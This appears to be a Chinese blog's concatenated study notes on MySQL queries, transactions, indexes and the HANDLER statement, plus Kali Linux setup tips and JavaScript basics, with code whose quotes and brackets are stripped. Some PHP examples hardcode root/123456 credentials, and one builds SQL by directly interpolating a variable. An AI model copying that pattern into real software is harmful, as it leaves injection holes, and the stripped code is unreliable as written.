是用于匹配的模式，可以包含通配符。 在命令提示符中使用 LIKE 子句 SELECT * from runoob_tbl WHERE runoob_author LIKE %COM; 在 PHP 脚本中使用 LIKE 子句 以下是我们使用PHP脚本在 runoob_tbl 表中读取 runoob_author 字段中以 COM 为结尾的的所有记录 ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = 123456; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));// 设置编码，防止中文乱码mysqli_query($conn , set names utf8); $sql = SELECT runoob_id, runoob_title, runoob_author, submission_date FROM runoob_tbl WHERE runoob_author LIKE %COM; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(无法读取数据: . mysqli_error($conn));echo h2菜鸟教程 mysqli_fetch_array 测试h2;echo table border=1trtd教程 ID/tdtd标题/tdtd作者/tdtd提交日期/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_title] /td . td$row[runoob_author] /td . td$row[submission_date] /td . /tr;echo /table;mysqli_close($conn);? MySQL UNION 操作符 MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行(从表中选取所有不同值组合在一起) UNION 操作符必须由两个或多个 SELECT 语句组成，每个 SELECT 语句的列数和对应位置的数据类型必须相同 SELECT column1, column2, ...FROM table1WHERE condition1UNIONSELECT column1, column2, ...FROM table2WHERE condition2[ORDER BY column1, column2, ...]; ORDER BY 子句是一个可选的子句，用于指定合并后的结果集的排序顺序 使用 UNION ALL 不去除重复行 MySQL ORDER BY(排序) 语句 MySQL ORDER BY(排序) 语句可以按照一个或多个列的值进行升序（ASC）或降序（DESC）排序 SELECT column1, column2, ...FROM table_nameORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...; 可以使用 NULLS FIRST 或 NULLS LAST 处理 NULL 值 在命令提示符中使用 ORDER BY 子句 SELECT * from runoob_tbl ORDER BY submission_date ASC; 读取 runoob_tbl 表中所有数据并按 submission_date 字段的升序排列 在 PHP 脚本中使用 ORDER BY 子句 ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = 123456; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));// 设置编码，防止中文乱码mysqli_query($conn , set names utf8); $sql = SELECT runoob_id, runoob_title, runoob_author, submission_date FROM runoob_tbl ORDER BY submission_date ASC; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(无法读取数据: . mysqli_error($conn));echo h2菜鸟教程 MySQL ORDER BY 测试h2;echo table border=1trtd教程 ID/tdtd标题/tdtd作者/tdtd提交日期/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_title] /td . td$row[runoob_author] /td . td$row[submission_date] /td . /tr;echo /table;mysqli_close($conn);? MySQL GROUP BY 语句 GROUP BY 语句根据一个或多个列对结果集进行分组。 在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。 SELECT column1, aggregate_function(column2)FROM table_nameWHERE conditionGROUP BY column1; column1：指定分组的列。 aggregate_function(column2)：对分组后的每个组执行的聚合函数。 table_name：要查询的表名。 condition：可选，用于筛选结果的条件。 SET NAMES utf8;SET FOREIGN_KEY_CHECKS = 0;-- ------------------------------ Table structure for `employee_tbl`-- ----------------------------DROP TABLE IF EXISTS `employee_tbl`;CREATE TABLE `employee_tbl` ( `id` INT(11) NOT NULL, `name` CHAR(10) NOT NULL DEFAULT , `date` datetime NOT NULL, `signin` tinyint(4) NOT NULL DEFAULT 0 COMMENT 登录次数, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;-- ------------------------------ Records of `employee_tbl`-- ----------------------------BEGIN;INSERT INTO `employee_tbl` VALUES (1, 小明, 2016-04-22 15:25:33, 1), (2, 小王, 2016-04-20 15:25:47, 3), (3, 小丽, 2016-04-19 15:26:02, 2), (4, 小王, 2016-04-07 15:26:14, 4), (5, 小明, 2016-04-11 15:26:40, 4), (6, 小明, 2016-04-04 15:26:54, 2);COMMIT;SET FOREIGN_KEY_CHECKS = 1; 导入成功后，执行以下 SQL 语句： mysql set names utf8;mysql SELECT * FROM employee_tbl;+----+--------+---------------------+--------+| id | name | date | signin |+----+--------+---------------------+--------+| 1 | 小明 | 2016-04-22 15:25:33 | 1 || 2 | 小王 | 2016-04-20 15:25:47 | 3 || 3 | 小丽 | 2016-04-19 15:26:02 | 2 || 4 | 小王 | 2016-04-07 15:26:14 | 4 || 5 | 小明 | 2016-04-11 15:26:40 | 4 || 6 | 小明 | 2016-04-04 15:26:54 | 2 |+----+--------+---------------------+--------+6 rows in set (0.00 sec) 使用 GROUP BY 语句 将数据表按名字进行分组，并统计每个人有多少条记录： mysql SELECT name, COUNT(*) FROM employee_tbl GROUP BY name;+--------+----------+| name | COUNT(*) |+--------+----------+| 小丽 | 1 || 小明 | 3 || 小王 | 2 |+--------+----------+3 rows in set (0.01 sec) WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）。 例如我们将以上的数据表按名字进行分组，再统计每个人登录的次数： mysql SELECT name, SUM(signin) as signin_count FROM employee_tbl GROUP BY name WITH ROLLUP;+--------+--------------+| name | signin_count |+--------+--------------+| 小丽 | 2 || 小明 | 7 || 小王 | 7 || NULL | 16 |+--------+--------------+4 rows in set (0.00 sec) 其中记录 NULL 表示所有人的登录次数。 我们可以使用 coalesce 来设置一个可以取代 NUll 的名称，coalesce 语法： 果 anull，则选择 b；如果 bnull,则选择 c；如果 a!=null,则选择 a；如果 a b c 都为 null ，则返回为 null（没意义） select coalesce(a,b,c); mysql SELECT coalesce(name, 总数), SUM(signin) as signin_count FROM employee_tbl GROUP BY name WITH ROLLUP;+--------------------------+--------------+| coalesce(name, 总数) | signin_count |+--------------------------+--------------+| 小丽 | 2 || 小明 | 7 || 小王 | 7 || 总数 | 16 |+--------------------------+--------------+4 rows in set (0.01 sec) MySQL 连接的使用 使用 MySQL 的 JOIN 在两个或多个表中查询数据 JOIN 按功能分类 INNER JOIN 返回两个表中满足连接条件的匹配行 SELECT column1, column2, ...FROM table1INNER JOIN table2 ON table1.column_name = table2.column_name; table1.column_name = table2.column_name 是连接条件，指定了两个表中用于匹配的列 LEFT JOIN 返回左表的所有行，并包括右表中匹配的行 SELECT column1, column2, ...FROM table1LEFT JOIN table2 ON table1.column_name = table2.column_name; RIGHT JOIN 返回右表的所有行，并包括左表中匹配的行 SELECT column1, column2, ...FROM table1RIGHT JOIN table2 ON table1.column_name = table2.column_name; 在命令提示符中使用 INNER JOIN 如在 RUNOOB 数据库中有两张表 tcount_tbl 和 runoob_tbl SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; 或 SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a, tcount_tbl b WHERE a.runoob_author = b.runoob_author; 在 PHP 脚本中使用 JOIN ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = 123456; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));// 设置编码，防止中文乱码mysqli_query($conn , set names utf8); $sql = SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(无法读取数据: . mysqli_error($conn));echo h2菜鸟教程 MySQL JOIN 测试h2;echo table border=1trtd教程 ID/tdtd作者/tdtd登陆次数/td/tr;while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) echo trtd $row[runoob_id]/td . td$row[runoob_author] /td . td$row[runoob_count] /td . /tr;echo /table;mysqli_close($conn);? MySQL NULL 值处理 IS NULL: 当列的值是 NULL,此运算符返回 true。 IS NOT NULL: 当列的值不为 NULL, 运算符返回 true。 =: 比较操作符（不同于 = 运算符），当比较的的两个值相等或者都为 NULL 时返回 true。 检查是否为 NULL SELECT * FROM 表名 WHERE 键名 IS NULL;SELECT * FROM 表名 WHERE 键名 IS NOT NULL; 处理NULL COALESCE() 函数 返回参数中的第一个非 NULL 值 SELECT name, COALESCE(age, 0) AS age FROM users; IFNULL() 函数 如果第一个参数为 NULL，返回第二个参数，否则返回第一个参数 SELECT name, IFNULL(age, 18) AS age FROM users; NULLIF() 函数 比较两个参数，如果它们相等则返回 NULL，否则返回第一个参数 SELECT NULLIF(5, 5); -- 返回 NULLSELECT NULLIF(5, 10); -- 返回 5 聚合函数的处理 COUNT(column)：忽略 NULL 值，只统计非 NULL 值的行。 COUNT(\\*)：统计所有行，包括 NULL。 SUM()、AVG() 等：会忽略 NULL 值，只计算非 NULL 值。 SELECT COUNT(age) AS count_age, COUNT(*) AS count_all FROM users; NULL 排序 在使用 ORDER BY 子句进行排序时，NULL 值默认会被放在排序的最后。如果希望将 NULL 值放在最前面，可以使用 ORDER BY column_name ASC NULLS FIRST，反之使用 ORDER BY column_name DESC NULLS LAST 使用 = 操作符进行 NULL 比较 = 操作符是 MySQL 中用于比较两个表达式是否相等的特殊操作符 SELECT * FROM employees WHERE commission = NULL; 使用 PHP 脚本处理 NULL 值 ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = 123456; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));// 设置编码，防止中文乱码mysqli_query($conn , set names utf8); if( isset($runoob_count )) $sql = SELECT runoob_author, runoob_count FROM runoob_test_tbl WHERE runoob_count = $runoob_count;else $sql = SELECT runoob_author, runoob_count FROM runoob_test_tbl WHERE runoob_count IS NULL;mysqli_select_db( $conn, RUNOOB );$retval = mysqli_query( $conn, $sql );if(! $retval ) die(无法读取数据: . mysqli_error($conn));echo h2菜鸟教程 IS NULL 测试h2;echo table border=1trtd作者/tdtd登陆次数/td/tr;while($row = mysqli_fetch_array($retval, MYSQL_ASSOC)) echo tr. td$row[runoob_author] /td . td$row[runoob_count] /td . /tr;echo /table;mysqli_close($conn);? MySQL 正则表达式 MySQL 中使用 REGEXP 和 RLIKE操作符来进行正则表达式匹配 SELECT column1, column2, ...FROM table_nameWHERE column_name REGEXP pattern; column1, column2, … 是你要选择的列的名称，如果使用 * 表示选择所有列。 table_name 是你要从中查询数据的表的名称。 column_name 是你要进行正则表达式匹配的列的名称。 'pattern' 是一个正则表达式模式。 \\w：匹配一个字母数字字符（包括下划线）。 \\s：匹配一个空白字符 MySQL 事务 事务是一组SQL语句的执行，它们被视为一个单独的工作单元 事务是必须满足4个条件（ACID）： 原子性（Atomicity，或称不可分割性）：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成 一致性（Consistency）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏 隔离性（Isolation，又称独立性）：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致 持久性（Durability）：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失 mysql事务处理 用 BEGIN, ROLLBACK, COMMIT BEGIN 或 START TRANSACTION：开用于开始一个事务。 ROLLBACK 事务回滚，取消之前的更改。 COMMIT：事务确认，提交事务，使更改永久生效。 SAVEPOINT：用于在事务中设置保存点，以便稍后能够回滚到该点 SAVEPOINT savepoint_name; ROLLBACK TO SAVEPOINT：用于回滚到之前设置的保存点 ROLLBACK TO SAVEPOINT savepoint_name; 用 SET 来改变 MySQL 的自动提交模式 SET AUTOCOMMIT=0 禁止自动提交 SET AUTOCOMMIT=1 开启自动提交 ?php$dbhost = localhost; // mysql服务器主机地址$dbuser = root; // mysql用户名$dbpass = 123456; // mysql用户名密码$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(! $conn ) die(连接失败: . mysqli_error($conn));// 设置编码，防止中文乱码mysqli_query($conn, set names utf8);mysqli_select_db( $conn, RUNOOB );mysqli_query($conn, SET AUTOCOMMIT=0); // 设置为不自动提交，因为MYSQL默认立即执行mysqli_begin_transaction($conn); // 开始事务定义 if(!mysqli_query($conn, insert into runoob_transaction_test (id) values(8))) mysqli_query($conn, ROLLBACK); // 判断当执行失败时回滚 if(!mysqli_query($conn, insert into runoob_transaction_test (id) values(9))) mysqli_query($conn, ROLLBACK); // 判断执行失败时回滚mysqli_commit($conn); //执行事务mysqli_close($conn);? MySQL ALTER 命令 MySQL 的 ALTER 命令用于修改数据库、表和索引等对象的结构 ALTER 命令允许你添加、修改或删除数据库对象，并且可以用于更改表的列定义、添加约束、创建和删除索引等操作 添加列 ALTER TABLE 数据表名ADD COLUMN 列名 新的数据类型; ALTER TABLE 数据表名 ADD 列名 新的数据类型 FIRST;ALTER TABLE 数据表名 ADD 列名 新的数据类型 AFTER 表中的列名; 修改列的数据类型 ALTER TABLE 数据表名MODIFY COLUMN 列名 新的数据类型; 修改列名 ALTER TABLE 数据表名CHANGE COLUMN 旧的列名 新的列名 新的数据类型; 删除列 ALTER TABLE 数据表名DROP COLUMN 列名; 添加 PRIMARY KEY ALTER TABLE 数据表名ADD PRIMARY KEY (列名); 添加 FOREIGN KEY ALTER TABLE 数据子表ADD CONSTRAINT 在子表中添加的外键 //用于关联到数据母表的列FOREIGN KEY (数据母表的列名)REFERENCES 数据母表 (数据母表的列名); 修改表名 ALTER TABLE 旧的表名RENAME TO 新的表名; MySQL 索引 MySQL 索引是一种数据结构，用于加快数据库查询的速度和性能 普通索引 创建索引 CREATE INDEX index_nameON table_name (column1 [ASC|DESC], column2 [ASC|DESC], ...); 修改表结构(添加索引) ALTER TABLE table_nameADD INDEX index_name (column1 [ASC|DESC], column2 [ASC|DESC], ...); 创建表的时候直接指定 CREATE TABLE table_name ( column1 data_type, column2 data_type, ..., INDEX index_name (column1 [ASC|DESC], column2 [ASC|DESC], ...)); 删除索引的语法 DROP INDEX index_name ON table_name; ALTER TABLE table_nameDROP INDEX index_name; 唯一索引 创建索引 CREATE UNIQUE INDEX index_nameON table_name (column1 [ASC|DESC], column2 [ASC|DESC], ...); 修改表结构添加索引 ALTER table table_name ADD CONSTRAINT unique_constraint_name UNIQUE (column1, column2, ...); 创建表的时候直接指定 CREATE TABLE table_name ( column1 data_type, column2 data_type, ..., CONSTRAINT index_name UNIQUE (column1 [ASC|DESC], column2 [ASC|DESC], ...)); 使用ALTER 命令添加和删除索引 ALTER TABLE tbl_name ADD PRIMARY KEY (column_list):该语句添加一个主键，主键列中的值必须唯一，主键的列的列表，可以是一个或多个列，不能包含 NULL 值。 。 ALTER TABLE tbl_name ADD UNIQUE index_name (column_list): 这条语句创建索引的值必须是唯一的（除了NULL外，NULL可能会出现多次）。 ALTER TABLE tbl_name ADD INDEX index_name (column_list): 添加普通索引，索引值可出现多次。 **ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list)😗*该语句指定了索引为 FULLTEXT ，用于全文索引。 使用 ALTER 命令添加和删除主键 主键作用于列上（可以一个列或多个列联合主键），添加主键时，你需要确保该主键默认不为空（NOT NULL） ALTER TABLE testalter_tbl MODIFY i INT NOT NULL;ALTER TABLE testalter_tbl ADD PRIMARY KEY (i); mysql ALTER TABLE testalter_tbl DROP PRIMARY KEY; 删除主键时只需指定 PRIMARY KEY，但在删除索引时，你必须知道索引名 显示索引信息 SHOW INDEX FROM table_name\\G SHOW INDEX: 用于显示索引信息的关键字。 FROM table_name: 指定要查看索引信息的表的名称。 \\G: 格式化输出信息。 MySQL 临时表（待） MySQL 复制表（待） MySQL 元数据（待） MySQL 序列使用（AUTO_INCREMENT）（待） MySQL 处理重复数据（待） MySQL 及 SQL 注入 SQL 注入，就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令 MySQL 导出数据（待） MySQL 导入数据（待） MySQL 函数，运算符，命令大全（待）","tags":["MySQL"],"categories":["数据库"]},{"title":"MySQL handler的用法与应用","path":"/2025/07/09/MySQL handler的用法与应用/","content":"MySQL handler的用法与应用 handler的用法 HANDLER是一个比较低级的语句，具有自己的会话机制，且会话对象不由其他会话共享，且直到会话调用 HANDLER... CLOSE 或会话终止时才关闭 HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name = | = | = | | (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name FIRST | NEXT | PREV | LAST [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ FIRST | NEXT [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE HANDLER tbl_name OPEN [ [AS] alias] handler tablename open; /开启tablename表hand tablename open as new_tablename; /追加tablename的表的别名为new_tablename，此处不是修改，且只在当前会话内生效 HANDLER tbl_name READ index_name = | = | = | | (value1,value2,...)[ WHERE where_condition ] [LIMIT ... ] handler tablename read Keyname=(test1); /读取tablename表的索引名为Keyname的值为test1的整行信息(每张表都会默认有索引列） HANDLER tbl_name READ index_name FIRST | NEXT | PREV | LAST [ WHERE where_condition ] [LIMIT ... ] handler tablename read listname first; /读取tablename表的列名为listname的第一个值的整行信息 HANDLER tbl_name READ FIRST | NEXT [ WHERE where_condition ] [LIMIT ... ] handler tablename read first; /读取tablename表的第一行信息。handler tablename read next; /读取tablename表的下一行信息。handler tablename read first limit 0,2; /读取tablename表的前两行信息。 HANDLER tbl_name CLOSE handler tablename close /退出handler会话（它于handler ... open是相对的） 例如： 已知一张表名为tablename，我们可以用下述语句 handler tablename open;handler tablename read frist;handler tablename close; 或 handler tablename open as test;handler test read frist;handler test close; 应用-[强网杯 2019]随便注","tags":["MySQL"],"categories":["数据库"]},{"title":"kali优化","path":"/2025/07/09/kali优化/","content":"这是一篇有关kali基础优化的文章 kali优化 kali解压打开默认密码为：kali 设置中文 打开Terminal，输入命令： shellsudo dpkg-reconfigure locales 进入后使用键盘的↑+↓←，到最底部，找到 [ ] zh_CN.UTF-8 UTF-8 ，按空格键选中，再按回车进入下一个页面，再选中 zh_CN.UTF-8作为默认语言，后回车 等待下载结束后重启即可 换源 因为官方源都是的速度慢，所以选择换国内源 打开Terminal，输入命令 shellsudo vim /etc/apt/sources.list 可选的国内源 plaintext#阿里云源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#清华大学源deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib#浙大源deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib 不懂vim语法的按以下步骤来 全选删除原本的内容 按esc键后，先按 g g（到达顶部），然后再按 d G(区分大小写！！！) 复制以上内容，右键粘贴 保存退出 按esc键后，同时按住shift键和英文:键，再输入wq 系统优化 1.设置root账户密码 shellsudo passwd root 2.设置禁止休眠 打开左上角kali图标 点击settings(设置) 点击进入power Manger(电源管理器) 在Power Manager 选择— display(显示) 把使用电池和插入电源下的依次把Blank after、Put to sleep after和Switch off after 全部设置成为 Never 3.软件数据库更新： plaintextapt-get update 4.软件更新： plaintextapt-get upgrade 5.系统更新： plaintextapt-get dist-upgrade 安装中文输入法 更新包管理器的软件包列表： plaintextsudo apt-get update 安装fcitx输入法框架： plaintextsudo apt-get install fcitx 安装fcitx-googlepinyin谷歌拼音输入法： plaintextsudo apt-get install fcitx-googlepinyin ctrl+space(空格)切换输入法 界面美化 1.整体字体放大 打开左上角kali图标 点击设置进入外观 选择字体，修改DPI 1.桌面图标大小 桌面右键选择桌面设置 选择图标，调节图标大小完成对桌面图标的调节。（这步也可以设置图标下的字体 自定义大小） 2.菜单栏大小以及位置 在菜单栏空白处右键—选择面板再点击面板首选项 打开面板后选择显示—尺寸—调节行大小 关闭锁定面板，可拖动作用两侧的小点将面板放置于最下侧 3.终端字体 打开终端再点击左上角文件点击参数设置 打开设置界面，界面设置—调节字体大小 4.系统字体 打开左上角kali图标 点击设置进入外观 选择字体，修改默认字体和默认等宽字体 4.窗口字体 打开左上角kali图标 点击设置进入窗口管理器 选择样式修改标题字体 kali mysql登录问题 不知用户名和密码（用root试过不行），我们自行更改root用户的密码 使用 sudo 登录 MySQL：sudo mysql 确定数据库版本 SELECT VERSION(); MariaDB版本 使用以下 SQL 语法来修改 root 用户的密码 SET PASSWORD FOR root@localhost = PASSWORD(your_new_password);或 UPDATE mysql.user SET password = PASSWORD(your_new_password) WHERE user = root AND host = localhost; MySQL版本 ALTER USER root@localhost IDENTIFIED BY your_new_password; 刷新权限 FLUSH PRIVILEGES; 如果以上方法仍然不起作用，可能是由于权限问题。可以检查 root 用户的权限配置： SELECT user, host, authentication_string, plugin FROM mysql.user WHERE user=root; 确认 root 用户是否具有正确的权限，并且插件是否配置为 mysql_native_password，或者可以通过 unix_socket 来进行身份验证 0.0.0.0","tags":["虚拟机","kali"],"categories":["kali虚拟机"]},{"title":"JavaScript","path":"/2025/07/09/JavaScript/","content":"JavaScript HTML 中的 Javascript 脚本代码必须位于 script 与 /script 标签间 Javascript 脚本代码可被放置在 HTML 页面的 body 和 head 中 JavaScript 输出 JavaScript 没有任何打印或者输出的函数 使用 window.alert() 弹出警告框来显示数据 使用 innerHTML 写入到 HTML 元素 document.getElementById(“demo”) 用 id 属性(标识 HTML 元素)来查找 HTML 元素的 JS 代码 **innerHTML = “段落已修改。”**用于修改元素的 HTML 内容(innerHTML)的JS 代码 使用 document.write() 方法将内容写到 HTML 文档中 用 document.write() 可以向文档写入内容。 如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。 使用 console.log() 写入到浏览器的控制台 使用 console.log() 方法在浏览器中( F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单)显示 JavaScript 值 JavaScript 语法 字面量 数字（Number）字面量 可以是整数或者是小数，或者是科学计数(e)【123e5=12300000】 字符串（String）字面量 可以使用单引号或双引号 表达式字面量 用于计算 数组（Array）字面量 定义一个数组 [40, 100, 1, 5, 25, 10] 对象（Object）字面量 定义一个对象 {firstName:“John”, lastName:“Doe”, age:50, eyeColor:“blue”} 函数（Function）字面量 定义一个函数 function myFunction(a, b) { return a * b;} 变量 变量用于存储数据值，使用关键字 var 来定义变量， 使用等号来为变量赋值 语句 用于向浏览器发出命令（详见下节） 数据类型 数字，字符串，数组，对象等 函数 JavaScript 语句 JavaScript 语句是发给浏览器的命令，告诉浏览器要做的事情 分号 ; 在每条可执行的语句结尾添加分号或在一行中编写多条语句 代码 是 JavaScript 语句的序列。浏览器按照编写顺序依次执行每条语句。 document.getElementById(demo).innerHTML=你好 Dolly; document.getElementById(myDIV).innerHTML=你最近怎么样?; 代码块 代码块的作用是一并地执行语句序列，左花括号开始，以右花括号结束 语句标识符 空格 JavaScript 会忽略多余的空格 折行 使用反斜杠对代码行进行换行 JavaScript 变量 变量声明 用 var 关键词来声明变量，变量可以先使用再声明 多变量 在一条语句中声明很多变量：该语句以 var 开头，并使用逗号分隔变量 var lastname=Doe, age=30, job=carpenter; 横跨多行 var lastname=Doe,age=30,job=carpenter; 一条语句中声明的多个变量不可以同时赋同一个值 var x,y,z=1; x,y 为 undefined， z 为 1。 重新声明变量 重新声明 JavaScript 变量，该变量的值不会丢失 var carname=Volvo;var carname; 两条语句执行后，变量 carname 的值依然是 “Volvo” 变量类型 JavaScript 变量可用于存放值（ x=5），表达式（z=x+y）和文本值 (name=“Bill Gates” 用双引号或单引号包围这个值)，一般倡导以字母开头 JavaScript 数据类型 值类型(基本类型)：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol 引用数据类型（对象类型）：对象(Object)、数组(Array)、函数(Function)，还有两个特殊的对象：正则（RegExp）和日期（Date） 变量的数据类型可以使用 typeof 操作符来查看 JavaScript 数组 JavaScript 不支持使用名字来索引数组，只允许使用数字索引 如果你使用名字作为索引，当访问数组时，JavaScript 会把数组重新定义为标准对象。 执行这样操作后，数组的方法及属性将不能再使用，否则会产生错误（person.length输出为0） 使用 new Array() 构造函数，通过 .length 获取数组长度 var cars=new Array();cars[0]=Saab;cars[1]=Volvo;cars[2]=BMW; var cars=new Array(Saab,Volvo,BMW); JavaScript 对象 对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义 对象属性两种访问方式 对象方法 对象的方法定义了一个函数，并作为对象的属性存储。对象方法通过添加 () 调用 (作为一个函数)。 typeof，Undefined 和 Null typeof 操作符来检测变量的数据类型 typeof John // 返回 stringtypeof 3.14 // 返回 numbertypeof NaN // 返回 numbertypeof false // 返回 booleantypeof [1,2,3,4] // 返回 objecttypeof name:John, age:34 // 返回 objecttypeof new Date() // 返回 objecttypeof function () // 返回 functiontypeof myCar // 返回 undefined (如果 myCar 没有声明)typeof null // 返回 object Undefined 这个值表示变量不含有值。任何变量都可以通过设置值为 undefined 来清空 null 表示 “什么都没有”，但类型为对象，是一个只有一个值的特殊类型。表示一个空对象引用。可以设置为 null 来清空变量。 在常规的比较==中，数据类型是被忽略的 在严格的比较运算中，=== 为恒等计算符，同时检查表达式的值与类型 JavaScript 函数 调用带参数的函数 变量和参数必须以一致的顺序出现（第一个变量就是第一个被传递的参数的给定的值） 带有返回值的函数 使用 return 语句时，函数会停止执行，并返回指定的值 JavaScript 作用域 作用域为可访问变量，对象，函数的集合 JavaScript 局部作用域 局部变量：只能在函数内部访问，局部变量在函数开始执行时创建，函数执行完后局部变量会自动销毁，不同的函数可以使用相同名称的变量 JavaScript 全局变量 全局变量有 全局作用域: 网页中所有脚本和函数均可使用 如果变量在函数内没有声明（没有使用 var 关键字），该变量为全局变量 JavaScript 字符串 JavaScript 字符串用于存储和处理文本 字符串的索引从 0 开始，这意味着第一个字符索引值为 [0]，第二个为 [1]，以此类推 特殊字符 反斜杠是一个转义字符。 转义字符将特殊字符转换为字符串字符 例如：可以在字符串中使用引号，字符串中的引号不要与字符串的引号相同（但可以在字符串添加转义字符来使用引号） 字符串长度 使用内置属性 length 来计算字符串的长度 模板字符串 模板字符串中可以同时使用单引号和双引号 模板字符串还支持多行文本，而无需使用特殊的转义字符： 模板字面量还可以包含占位符——一种由美元符号和大括号分隔的嵌入式表达式：${expression} JavaScript 运算符 用于字符串的 + 运算符 + 运算符用于把文本值或字符串变量加起来（连接起来） 如需把两个或多个字符串变量连接起来，请使用 + 运算符 要想在两个字符串之间增加空格，需要把空格插入一个字符串之中或者把空格插入表达式中(txt3=txt1+ +txt2) **规则:**如果把数字与字符串相加，结果将成为字符串！ 条件运算符 variablename=(condition)?value1:value2 加法是两个数字相加。 连接是两个字符串连接。 var x = 10 + 5; // x 的结果为 15var x = 10 + 5; // x 的结果为 105 JavaScript循环 在 switch 语句中，用恒等计算符(===)进行比较 var x = 10;switch(x) case 10: alert(Hello); 上例会出现弹窗 JavaScript 类型转换 constructor 属性 constructor 属性返回所有 JavaScript 变量的构造函数 John.constructor // 返回函数 String() [native code] (3.14).constructor // 返回函数 Number() [native code] false.constructor // 返回函数 Boolean() [native code] [1,2,3,4].constructor // 返回函数 Array() [native code] name:John, age:34.constructor // 返回函数 Object() [native code] new Date().constructor // 返回函数 Date() [native code] function () .constructor // 返回函数 Function() [native code] JavaScript 类型转换 JavaScript 变量可以转换为新变量或其他数据类型 将数字转换为字符串 全局方法 String() 可以将数字，字母，变量，表达式转换为字符串 String(x) String(123) Number 方法 toString() 也是 x.toString() (123).toString() 方法 描述 toExponential() 把对象的值转换为指数计数法。 toFixed() 把数字转换为字符串，结果的小数点后有指定位数的数字。 toPrecision() 把数字格式化为指定的长度。 将布尔值转换为字符串 全局方法 String() Boolean 方法 toString() 将日期转换为字符串 Date() 返回字符串。 Date() 全局方法 String() 可以将日期对象转换为字符串。 String(new Date()) Date 方法 toString() 也有相同的效果。 obj = new Date()obj.toString() 方法 描述 getDate() 从 Date 对象返回一个月中的某一天 (1 ~ 31)。 getDay() 从 Date 对象返回一周中的某一天 (0 ~ 6)。 getFullYear() 从 Date 对象以四位数字返回年份。 getHours() 返回 Date 对象的小时 (0 ~ 23)。 getMilliseconds() 返回 Date 对象的毫秒(0 ~ 999)。 getMinutes() 返回 Date 对象的分钟 (0 ~ 59)。 getMonth() 从 Date 对象返回月份 (0 ~ 11)。 getSeconds() 返回 Date 对象的秒数 (0 ~ 59)。 getTime() 返回 1970 年 1 月 1 日至今的毫秒数。 将字符串转换为数字 全局方法 Number() Number(3.14) // 返回 3.14Number( ) // 返回 0Number() // 返回 0Number(99 88) // 返回 NaN 方法 描述 parseFloat() 解析一个字符串，并返回一个浮点数。 parseInt() 解析一个字符串，并返回一个整数。 将布尔值转换为数字 全局方法 Number() 将日期转换为数字 全局方法 Number() d = new Date();Number(d) 日期方法 getTime() d = new Date();d.getTime() 自动转换为字符串 当你尝试输出一个对象或一个变量时 JavaScript 会自动调用变量的 toString() 方法： document.getElementById(demo).innerHTML = myVar;myVar = name:Fjohn // toString 转换为 [object Object]myVar = [1,2,3,4] // toString 转换为 1,2,3,4myVar = new Date() // toString 转换为 Fri Jul 18 2014 09:08:55 GMT+0200 数字和布尔值也经常相互转换： myVar = 123 // toString 转换为 123myVar = true // toString 转换为 truemyVar = false // toString 转换为 false JavaScript 正则表达式 